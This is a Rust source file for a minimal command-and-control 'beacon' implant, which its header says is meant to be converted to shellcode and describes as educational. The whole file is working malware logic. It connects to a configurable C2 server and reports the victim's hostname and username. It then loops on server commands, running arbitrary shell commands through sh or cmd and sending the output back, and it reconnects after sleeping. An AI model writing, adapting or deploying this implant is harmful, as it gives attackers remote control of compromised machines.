//! A minimal beacon implementation suitable for conversion to shellcode
//! This is for educational and research purposes only

use std::net::TcpStream;
use std::io::{Read, Write};
use std::process::Command;
use std::ffi::CString;
use std::os::raw::{c_char, c_int};

// Note: For a real shellcode beacon, we'd use no_std and avoid any dependencies
// This is simplified for educational purposes

// C compatible function that will be our entry point
#[no_mangle]
pub extern "C" fn beacon_main() -> c_int {
    // Basic configuration
    const SERVER: &str = "localhost";
    const PORT: u16 = 8080;
    const SLEEP_SECONDS: u64 = 30;
    
    // Try to connect to C2 server
    if let Ok(mut stream) = TcpStream::connect((SERVER, PORT)) {
        // Send system info
        let hostname = get_hostname();
        let username = get_username();
        
        let info = format!("BEACON:{}:{}", hostname, username);
        let _ = stream.write(info.as_bytes());
        
        // Main beacon loop
        loop {
            // Read command
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(n) if n > 0 => {
                    let cmd = String::from_utf8_lossy(&buffer[..n]).to_string();
                    
                    // Process command
                    if cmd.starts_with("TERMINATE") {
                        break;
                    } else if cmd.starts_with("SLEEP:") {
                        if let Ok(seconds) = cmd[6..].parse::<u64>() {
                            // In shellcode we would implement a sleep function
                            // without using std library
                            std::thread::sleep(std::time::Duration::from_secs(seconds));
                        }
                    } else if cmd.starts_with("SHELL:") {
                        let shell_cmd = &cmd[6..];
                        if let Ok(output) = execute_command(shell_cmd) {
                            let _ = stream.write(output.as_bytes());
                        } else {
                            let _ = stream.write(b"Command execution failed");
                        }
                    }
                }
                _ => {
                    // Connection lost or error, sleep and try again
                    std::thread::sleep(std::time::Duration::from_secs(SLEEP_SECONDS));
                    if let Ok(new_stream) = TcpStream::connect((SERVER, PORT)) {
                        stream = new_stream;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    
    0 // Return success
}

// Get hostname (simplified for research)
fn get_hostname() -> String {
    if let Ok(output) = Command::new("hostname").output() {
        String::from_utf8_lossy(&output.stdout).trim().to_string()
    } else {
        "unknown".to_string()
    }
}

// Get username (simplified for research)
fn get_username() -> String {
    if let Ok(output) = Command::new("whoami").output() {
        String::from_utf8_lossy(&output.stdout).trim().to_string()
    } else {
        "unknown".to_string()
    }
}

// Execute shell command
fn execute_command(cmd: &str) -> Result<String, String> {
    let output = if cfg!(target_family = "unix") {
        Command::new("sh").arg("-c").arg(cmd).output()
    } else {
        Command::new("cmd").arg("/C").arg(cmd).output()
    };
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            
            if output.status.success() {
                Ok(stdout)
            } else {
                Ok(format!("Error: {}\n{}", output.status, stderr))
            }
        }
        Err(e) => Err(e.to_string()),
    }
}
